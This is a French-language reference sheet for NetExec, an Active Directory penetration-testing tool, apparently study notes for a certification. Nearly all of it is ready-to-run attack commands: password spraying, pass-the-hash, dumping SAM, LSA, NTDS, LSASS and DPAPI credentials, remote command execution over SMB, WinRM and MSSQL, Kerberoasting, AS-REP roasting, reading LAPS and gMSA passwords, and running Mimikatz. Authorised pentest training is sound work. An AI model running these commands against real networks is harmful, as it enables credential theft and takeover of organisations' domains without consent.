# NetExec (nxc) — Référence complète

> Successeur de CrackMapExec (cme). L'outil couteau-suisse du pentest AD. Parle SMB, LDAP, WinRM, RDP, MSSQL, SSH...

---

## Variables de référence

```bash
DC_IP="192.168.X.10"
RANGE="192.168.X.0/24"
DOMAIN="ENTREPRISE"
USER="alice"
PWD="Password123!"
NT_HASH="AABBCCDDEEFF001122"   # Partie NT uniquement (sans LM:)
HASH="aad3b435b51404eeaad3b435b51404ee:AABBCCDDEEFF001122"
```

---

## SMB — Usage principal

### Découverte et validation

```bash
# Valider credentials sur tout le réseau
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN

# Pass-the-Hash sur tout le réseau
nxc smb $RANGE -u $USER -H $NT_HASH -d $DOMAIN

# Null session
nxc smb $DC_IP -u '' -p ''
nxc smb $DC_IP -u 'a' -p ''

# Tester plusieurs users avec même mdp (password spraying)
nxc smb $DC_IP -u users.txt -p 'Password2024' --continue-on-success

# Tester plusieurs mdp sur un user
nxc smb $DC_IP -u $USER -p passwords.txt --continue-on-success
```

> `(Pwn3d!)` dans la sortie = tu es **admin local** sur cette machine.

### Énumération

```bash
# Lister les partages
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --shares

# Lister les utilisateurs du domaine
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --users

# Lister les groupes
nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --groups

# Sessions actives
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --sessions

# Utilisateurs connectés
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN --loggedon-users

# Politique de mot de passe
nxc smb $DC_IP -u $USER -p $PWD --pass-pol

# RID brute (liste d'users sans auth)
nxc smb $DC_IP -u '' -p '' --rid-brute 10000
```

### Dump de credentials

```bash
# Dump SAM (comptes locaux)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --sam

# Dump LSA (secrets, comptes service)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --lsa

# Dump NTDS (DCSync via SMB)
nxc smb $DC_IP -u $USER -H $NT_HASH -d $DOMAIN --ntds

# Dump LSASS (sessions actives)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -M lsassy

# DPAPI (credentials navigateur, gestionnaire de mdp)
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN --dpapi
```

### Exécution de commandes

```bash
# Commande CMD
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -x 'whoami /all'
nxc smb $TARGET -u $USER -p $PWD -d $DOMAIN -x 'net user'

# Commande PowerShell
nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN -X 'Get-Process'
nxc smb $TARGET -u $USER -p $PWD -d $DOMAIN -X 'Get-ADUser -Filter *'
```

### Spider des partages

```bash
# Spider + sauvegarde liste fichiers
nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN -M spider_plus

# Résultats dans /tmp/nxc_spider_plus/
cat /tmp/nxc_spider_plus/$TARGET.json | python3 -m json.tool | grep -i "flag\|pass\|cred"
```

### Génération de liste relay

```bash
# Machines sans signature SMB (pour ntlmrelayx)
nxc smb $RANGE --gen-relay-list ~/certif/targets_relay.txt
```

---

## LDAP

```bash
# Énumération LDAP basique
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN

# Kerberoasting
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --kerberoasting ~/certif/hashes/kerberoast.hash

# AS-REP Roasting
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --asreproast ~/certif/hashes/asrep.hash

# BloodHound collection
nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
    --bloodhound --collection All --dns-server $DC_IP

# LAPS passwords
nxc ldap $DC_IP -d $DOMAIN -u $USER -p $PWD --module laps

# gMSA passwords
nxc ldap $DC_IP -u $USER -p $PWD --gmsa
```

---

## WinRM (port 5985)

```bash
# Valider accès WinRM
nxc winrm $RANGE -u $USER -p $PWD -d $DOMAIN

# Pass-the-Hash
nxc winrm $TARGET -u $USER -H $NT_HASH -d $DOMAIN

# Exécuter une commande
nxc winrm $TARGET -u $USER -H $NT_HASH -d $DOMAIN -x 'whoami'
```

---

## MSSQL (port 1433)

```bash
# Valider accès MSSQL (Windows auth)
nxc mssql $TARGET -u $USER -H $NT_HASH -d $DOMAIN

# Requête SQL
nxc mssql $TARGET -u $USER -p $PWD -d $DOMAIN \
    -q "SELECT @@version"

# Commande OS via xp_cmdshell (si activé)
nxc mssql $TARGET -u $USER -p $PWD -d $DOMAIN \
    --local-auth -x 'whoami'
```

---

## RDP (port 3389)

```bash
# Valider accès RDP
nxc rdp $RANGE -u $USER -p $PWD -d $DOMAIN

# Screenshot (sans se connecter)
nxc rdp $TARGET -u $USER -p $PWD -d $DOMAIN --screenshot
```

---

## Mode Kerberos (avec ticket .ccache)

```bash
export KRB5CCNAME=Administrator.ccache

nxc smb $DC_FQDN -u Administrator --use-kcache -d $DOMAIN
nxc ldap $DC_FQDN -u Administrator --use-kcache -d $DOMAIN
```

---

## Modules utiles

```bash
# Lister les modules disponibles
nxc smb -L

# Modules courants
nxc smb $TARGET -u $USER -p $PWD -M lsassy        # Dump LSASS
nxc smb $TARGET -u $USER -p $PWD -M spider_plus   # Spider fichiers
nxc smb $TARGET -u $USER -p $PWD -M procdump      # Dump LSASS via procdump
nxc ldap $DC_IP -u $USER -p $PWD -M laps          # Lire passwords LAPS
nxc smb $TARGET -u $USER -p $PWD -M mimikatz      # Exécuter Mimikatz
```

---

## Tableau de référence rapide

| Protocole | Commande | Usage |
|-----------|---------|-------|
| SMB | `--shares` | Lister les partages |
| SMB | `--users` | Lister les utilisateurs |
| SMB | `--groups` | Lister les groupes |
| SMB | `--sam` | Dump SAM (comptes locaux) |
| SMB | `--lsa` | Dump LSA secrets |
| SMB | `--ntds` | DCSync (tous les hashes AD) |
| SMB | `-x` | Exécuter commande CMD |
| SMB | `-X` | Exécuter commande PowerShell |
| SMB | `--gen-relay-list` | Machines sans signing SMB |
| SMB | `--pass-pol` | Politique de mot de passe |
| LDAP | `--kerberoasting` | Kerberoasting |
| LDAP | `--asreproast` | AS-REP Roasting |
| LDAP | `--bloodhound` | Collecte BloodHound |
| LDAP | `--gmsa` | Passwords gMSA |
| LDAP | `laps` | Passwords LAPS |
| WinRM | `-x` | Exécution de commandes |
